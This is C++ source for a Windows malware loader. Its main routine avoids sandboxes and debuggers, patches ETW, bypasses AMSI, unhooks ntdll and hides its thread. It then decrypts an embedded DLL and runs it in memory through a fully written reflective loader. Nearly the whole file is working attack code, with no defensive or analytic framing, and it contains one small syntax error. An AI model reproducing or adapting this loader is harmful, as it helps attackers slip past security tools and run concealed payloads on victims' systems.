#include <windows.h>
#include <winternl.h>
#include <vector>
#include "EmbeddedPayload.h"
#include "Common/XChaCha20.h"
#include "EvasionTechniques/AntiDebug.h"
#include "EvasionTechniques/AntiSandbox.h"
#include "EvasionTechniques/AntiAV.h"
#include "EvasionTechniques/ThreadHider.h"


bool reflective_load_dll(const std::vector<uint8_t>& dll_bytes) {
    if (dll_bytes.empty()) return false;

    PIMAGE_DOS_HEADER dos = reinterpret_cast<PIMAGE_DOS_HEADER>(
        const_cast<uint8_t*>(dll_bytes.data()));
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

    PIMAGE_NT_HEADERS nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        dll_bytes.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    SIZE_T image_size = nt->OptionalHeader.SizeOfImage;

    uint8_t* image_base = reinterpret_cast<uint8_t*>(
        VirtualAlloc(nullptr, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!image_base) return false;

    memcpy(image_base, dll_bytes.data(), nt->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData > 0) {
            memcpy(image_base + section[i].VirtualAddress,
                   dll_bytes.data() + section[i].PointerToRawData,
                   section[i].SizeOfRawData);
        }
    }

    uintptr_t delta = reinterpret_cast<uintptr_t>(image_base) - nt->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY reloc_dir = 
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir.VirtualAddress && reloc_dir.Size) {
            PIMAGE_BASE_RELOCATION reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
                image_base + reloc_dir.VirtualAddress);
            while (reloc->VirtualAddress && reloc->SizeOfBlock) {
                uint16_t* entries = reinterpret_cast<uint16_t*>(
                    reinterpret_cast<uint8_t*>(reloc) + sizeof(IMAGE_BASE_RELOCATION));
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
                for (DWORD i = 0; i < count; i++) {
                    if ((entries[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        uintptr_t* patch = reinterpret_cast<uintptr_t*>(
                            image_base + reloc->VirtualAddress + (entries[i] & 0xFFF));
                        *patch += delta;
                    }
                }
                reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
                    reinterpret_cast<uint8_t*>(reloc) + reloc->SizeOfBlock);
            }
        }
    }

    IMAGE_DATA_DIRECTORY import_dir = 
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir.VirtualAddress && import_dir.Size) {
        PIMAGE_IMPORT_DESCRIPTOR import = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
            image_base + import_dir.VirtualAddress);
        while (import->Name) {
            const char* module_name = reinterpret_cast<const char*>(
                image_base + import->Name);
            HMODULE h_mod = LoadLibraryA(module_name);
            if (!h_mod) return false;

            uintptr_t* thunk = reinterpret_cast<uintptr_t*>(
                image_base + (import->OriginalFirstThunk ? import->OriginalFirstThunk : import->FirstThunk));
            uintptr_t* iat = reinterpret_cast<uintptr_t*>(
                image_base + import->FirstThunk);

            while (*thunk) {
                if (*thunk & IMAGE_ORDINAL_FLAG64) {
                    *iat = reinterpret_cast<uintptr_t>(
                        GetProcAddress(h_mod, reinterpret_cast<const char*>(*thunk & 0xFFFF)));
                } else {
                    PIMAGE_IMPORT_BY_NAME by_name = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                        image_base + *thunk);
                    *iat = reinterpret_cast<uintptr_t>(
                        GetProcAddress(h_mod, by_name->Name));
                }
                thunk++;
                iat++;
            }
            import++;
        }
    }

    DWORD old_protect;
    VirtualProtect(image_base, image_size, PAGE_EXECUTE_READ, &old_protect);

    using DllMain_t = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
    DllMain_t dll_main = reinterpret_cast<DllMain_t>(
        image_base + nt->OptionalHeader.AddressOfEntryPoint);

    if (dll_main) {
        __try {
            dll_main(reinterpret_cast<HINSTANCE>(image_base), DLL_PROCESS_ATTACH, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    return true;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    if (AntiSandbox::is_sandboxed()) {
        return 0
    }

    if (AntiDebug::detect_and_react()) {
        return 0;
    }

    ETWBlocker::patch_etw();
    AMSIBlocker::full_amsi_bypass();
    AntiAV::unhook_ntdll();

    ThreadHider::hide_thread();

    XChaCha20 decryptor;
    decryptor.init(DLL_KEY, DLL_NONCE);

    std::vector<uint8_t> dll_bytes(ENCRYPTED_DLL, ENCRYPTED_DLL + ENCRYPTED_DLL_SIZE);
    decryptor.process(dll_bytes.data(), dll_bytes.size());

    bool success = reflective_load_dll(dll_bytes);

    SecureZeroMemory(dll_bytes.data(), dll_bytes.size());

    return success ? 1 : 0;
}

int main() {
    return WinMain(GetModuleHandle(nullptr), nullptr, nullptr, 0);
}